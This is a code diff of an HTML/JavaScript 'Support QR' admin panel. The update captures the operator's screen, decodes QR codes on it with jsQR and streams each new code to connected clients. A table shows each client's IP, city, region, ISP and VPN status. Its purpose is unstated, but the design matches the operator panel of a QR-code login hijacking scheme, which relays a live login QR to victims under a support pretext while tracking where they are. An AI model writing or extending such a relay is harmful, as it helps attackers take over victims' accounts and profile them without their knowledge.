@@ -3,50 +3,46 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Ultimate Admin Panel - Support QR</title>
+<title>Admin Panel - Support QR</title>
 <script src="/socket.io/socket.io.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
 <style>
 body {
   font-family: "Segoe UI", Arial, sans-serif;
   background: #f8f9fa;
   margin: 0;
+  padding: 25px;
   display: flex;
   flex-direction: column;
   align-items: center;
-  padding: 25px;
 }
-h2 { margin-bottom: 15px; font-weight: 600; }
 .panel {
   background: white;
   padding: 20px;
   border-radius: 12px;
   box-shadow: 0 0 10px rgba(0,0,0,0.1);
-  max-width: 900px;
   width: 100%;
+  max-width: 900px;
 }
 .controls {
   display: flex;
   flex-wrap: wrap;
   gap: 10px;
   justify-content: center;
-  margin-bottom: 20px;
+  margin-bottom: 15px;
 }
-button, select {
-  padding: 10px 18px;
+button, input {
+  padding: 8px 14px;
   border: none;
   border-radius: 6px;
   font-weight: 600;
   cursor: pointer;
 }
 button.start { background: #007bff; color: white; }
-button.start:hover { background: #0062cc; }
 button.stop { background: #dc3545; color: white; }
-button.stop:hover { background: #c82333; }
 button.hide { background: #6c757d; color: white; }
-button.hide:hover { background: #5a6268; }
-button.freeze { background: #ffc107; color: black; }
-button.freeze:hover { background: #e0a800; }
-
+button.pause { background: #ffc107; color: black; }
+button:hover { opacity: 0.9; }
 #qrPreview {
   background: #fff;
   border-radius: 10px;
@@ -59,7 +55,6 @@ button.freeze:hover { background: #e0a800; }
   margin-bottom: 20px;
 }
 #statusText { text-align: center; font-weight: bold; margin-bottom: 10px; }
-
 #clientTable {
   width: 100%;
   border-collapse: collapse;
@@ -71,50 +66,46 @@ button.freeze:hover { background: #e0a800; }
   text-align: center;
 }
 #clientTable th { background: #e9ecef; }
-select {
-  padding: 8px 12px;
+.intervalBox { display: flex; align-items: center; gap: 5px; }
+.intervalBox input {
+  width: 80px;
   border: 1px solid #ccc;
+  text-align: right;
 }
+video { display:none; }
 </style>
 </head>
 <body>
-  <div class="panel">
-    <h2>Admin Panel - Support QR</h2>
-    <div class="controls">
-      <button class="start" id="startBtn">Start Stream</button>
-      <button class="stop" id="stopBtn">Stop Stream</button>
-      <button class="hide" id="hideBtn">Hide</button>
-      <button class="freeze" id="pauseBtn">Pause</button>
-      <label>Scan Interval:
-        <select id="intervalSelect">
-          <option value="1000">1s</option>
-          <option value="2000">2s</option>
-          <option value="3000" selected>3s</option>
-          <option value="5000">5s</option>
-          <option value="10000">10s</option>
-        </select>
-      </label>
+<div class="panel">
+  <h2>Admin Panel - Support QR</h2>
+
+  <div class="controls">
+    <button class="start" id="startBtn">Start Stream</button>
+    <button class="stop" id="stopBtn">Stop Stream</button>
+    <button class="hide" id="hideBtn">Hide</button>
+    <button class="pause" id="pauseBtn">Pause</button>
+    <div class="intervalBox">
+      <label>Scan Interval (s):</label>
+      <input id="intervalInput" type="number" step="0.05" min="0.25" max="5" value="0.5">
     </div>
-
-    <div id="qrPreview">No active QR</div>
-    <div id="statusText">Status: Inactive</div>
-
-    <table id="clientTable">
-      <thead>
-        <tr>
-          <th>Name</th>
-          <th>IP</th>
-          <th>City</th>
-          <th>Region</th>
-          <th>Country</th>
-          <th>ISP</th>
-          <th>VPN</th>
-          <th>Ping (ms)</th>
-        </tr>
-      </thead>
-      <tbody id="clientBody"></tbody>
-    </table>
   </div>
+
+  <div id="qrPreview">No active QR</div>
+  <div id="statusText">Status: Inactive</div>
+
+  <video id="video" autoplay muted></video>
+  <canvas id="canvas"></canvas>
+
+  <table id="clientTable">
+    <thead>
+      <tr>
+        <th>Name</th><th>IP</th><th>City</th><th>Region</th>
+        <th>Country</th><th>ISP</th><th>VPN</th><th>Ping (ms)</th>
+      </tr>
+    </thead>
+    <tbody id="clientBody"></tbody>
+  </table>
+</div>
 
 <script>
 const socket = io();
@@ -122,17 +113,20 @@ let isStreaming = false;
 let isHidden = false;
 let isPaused = false;
 let currentQR = null;
-let scanInterval = 3000; // default 3s
-let lastUpdate = 0;
+let scanInterval = 500; // 0.5s default
+let stream = null;
+let detectLoop = null;
 
 const startBtn = document.getElementById('startBtn');
 const stopBtn = document.getElementById('stopBtn');
 const hideBtn = document.getElementById('hideBtn');
 const pauseBtn = document.getElementById('pauseBtn');
-const intervalSelect = document.getElementById('intervalSelect');
+const intervalInput = document.getElementById('intervalInput');
 const qrPreview = document.getElementById('qrPreview');
 const statusText = document.getElementById('statusText');
 const clientBody = document.getElementById('clientBody');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
 
 socket.emit('join', 'admin');
 
@@ -143,56 +137,57 @@ socket.on('state', (s) => {
   updateStatus();
   updatePreview();
 });
-
 socket.on('client_list', updateClients);
-
-// Admin receives QR updates
-socket.on('qr_preview', (val) => {
-  const now = Date.now();
-  if (!isStreaming || isPaused) return; // paused or stopped
-  if (now - lastUpdate < scanInterval) return; // obey scan interval
-  lastUpdate = now;
-  if (!isHidden && val) {
-    currentQR = val;
-    qrPreview.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(val)}" alt="QR">`;
-  }
-});
-
 socket.on('hide_state', (hidden) => {
   isHidden = hidden;
   updateStatus();
   updatePreview();
 });
 
-function updateStatus() {
-  const states = [];
-  if (isStreaming) states.push('Streaming');
-  if (isHidden) states.push('Hidden');
-  if (isPaused) states.push('Paused');
-  statusText.textContent = `Status: ${states.length ? states.join(' / ') : 'Inactive'}`;
-}
-
-function updatePreview() {
-  if (isHidden) {
-    qrPreview.textContent = 'QR is hidden';
-  } else if (!currentQR) {
-    qrPreview.textContent = 'No active QR';
-  } else {
-    qrPreview.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(currentQR)}" alt="QR">`;
+// --- QR preview from server ---
+socket.on('qr_preview', (val) => {
+  if (!isStreaming || isPaused) return;
+  if (!isHidden && val) {
+    currentQR = val;
+    qrPreview.innerHTML =
+      `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(val)}" alt="QR">`;
   }
+});
+
+function updateStatus() {
+  let status = [];
+  if (isStreaming) status.push('Streaming');
+  if (isHidden) status.push('Hidden');
+  if (isPaused) status.push('Paused');
+  statusText.textContent = `Status: ${status.length ? status.join(' / ') : 'Inactive'}`;
+}
+function updatePreview() {
+  if (isHidden) qrPreview.textContent = 'QR is hidden';
+  else if (!currentQR) qrPreview.textContent = 'No active QR';
+  else qrPreview.innerHTML =
+    `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(currentQR)}" alt="QR">`;
 }
 
-// --- Button actions ---
-startBtn.onclick = () => {
-  socket.emit('start_stream');
-  isStreaming = true;
-  updateStatus();
+// --- Start screen share & detection ---
+startBtn.onclick = async () => {
+  try {
+    stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+    video.srcObject = stream;
+    isStreaming = true;
+    socket.emit('start_stream');
+    runDetection();
+    updateStatus();
+  } catch (err) {
+    alert('Screen sharing failed: ' + err.message);
+  }
 };
 
 stopBtn.onclick = () => {
-  socket.emit('stop_stream');
+  if (detectLoop) clearInterval(detectLoop);
+  if (stream) stream.getTracks().forEach(t => t.stop());
   isStreaming = false;
   currentQR = null;
+  socket.emit('stop_stream');
   updatePreview();
   updateStatus();
 };
@@ -211,11 +206,41 @@ pauseBtn.onclick = () => {
   updateStatus();
 };
 
-intervalSelect.onchange = () => {
-  scanInterval = parseInt(intervalSelect.value);
+// --- Custom interval ---
+intervalInput.oninput = () => {
+  let val = parseFloat(intervalInput.value);
+  if (isNaN(val) || val < 0.25) val = 0.25;
+  if (val > 5) val = 5;
+  scanInterval = val * 1000;
+  if (detectLoop) {
+    clearInterval(detectLoop);
+    runDetection();
+  }
 };
 
-// --- Client list update ---
+// --- QR Detection loop ---
+function runDetection() {
+  if (detectLoop) clearInterval(detectLoop);
+  const ctx = canvas.getContext('2d');
+  detectLoop = setInterval(() => {
+    if (!isStreaming || isPaused || !video.videoWidth) return;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const code = jsQR(imgData.data, imgData.width, imgData.height);
+    if (code && code.data && code.data !== currentQR) {
+      currentQR = code.data;
+      if (!isHidden) {
+        qrPreview.innerHTML =
+          `<img src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(code.data)}" alt="QR">`;
+      }
+      socket.emit('qr_update', code.data);
+    }
+  }, scanInterval);
+}
+
+// --- Client list ---
 function updateClients(list) {
   clientBody.innerHTML = '';
   list.forEach(c => {
